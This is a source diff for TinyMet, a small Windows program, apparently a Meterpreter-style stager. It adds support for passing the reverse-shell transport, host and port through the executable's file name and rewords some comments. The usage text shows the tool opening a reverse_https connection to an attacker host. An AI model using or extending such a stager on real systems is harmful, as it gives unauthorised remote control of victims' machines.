@@ -51,15 +51,18 @@ LPWSTR* arglist;
 char* TRANSPORT;
 char* LHOST;
 char* LPORT;
-char helptext[] = "TinyMet v0.2\nwww.tinymet.com\n\n"
+char helptext[] = "TinyMet v0.2\ntinymet.com\n\n"
 "Usage: tinymet.exe [transport] LHOST LPORT\n"
+"Or you can specify arguments through filename itself, separated by underscore.\n"
+"like TRANSPORT_LHOST_LPORT.exe\n\n"
 "Available transports are as follows:\n"
 "    0: reverse_tcp\n"
 "    1: reverse_http\n"
 "    2: reverse_https\n"
 "    3: bind_tcp\n"
 "\nExample:\n"
-"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
+"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n"
+"setting the filename to \"2_host.com_443.exe\" and running it without args will do exactly the same\n";
 
 // Functions ...
 void err_exit(char* message){
@@ -275,7 +278,7 @@ void parse_args_from_cl(const wchar_t* args) {
 	wchar_t* lastdot;
 
 	filename = wcsrchr(arglist[0], '\\');	// Aargh! (under remarks, note) https://msdn.microsoft.com/en-us/library/windows/desktop/ms683156(v=vs.85).aspx
-											// Program behaves different if being debugged, sometimes the arglist[0] has full path, and sometimes it will be just the name :/
+											// GetCommandLineW() behaves different if being debugged, sometimes the arglist[0] has full path, and sometimes it will be just the name :/
 											// COUNTLESS hours spent trying to find the issue (not that much, but annoying as hell)
 	if (!filename) {
 		filename = arglist[0];
@@ -342,16 +345,17 @@ int main()
 
 	// Case 2: maybe "1_host.com_80.exe", then parse, or simply "tinymet.exe" then print_help and exit.
 	else if (argsCount == 1) {
-		parse_args_from_cl(arglist[0]); // that arglist[0] is freakin' stupid ... sometimes it has the path, and sometimes it's the file without path
+		parse_args_from_cl(arglist[0]); // that GetCommandLineW()/CommandLineToArgvW() arglist[0] is freakin' stupid
+										// ... sometimes it has the path, and sometimes it's the filename without path
 	}
 
-	// you have no idea how this thing works
+	// ... you simply have no idea how this thing works
 	else {
 		printf(helptext);
 		exit(-1);
 	}
 
-	// by now, the program either exited because of error, or all args are parsed ...
+	// by now, the program has either exited because of error, or all args are parsed ...
 	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);
 
 	// pick transport ...
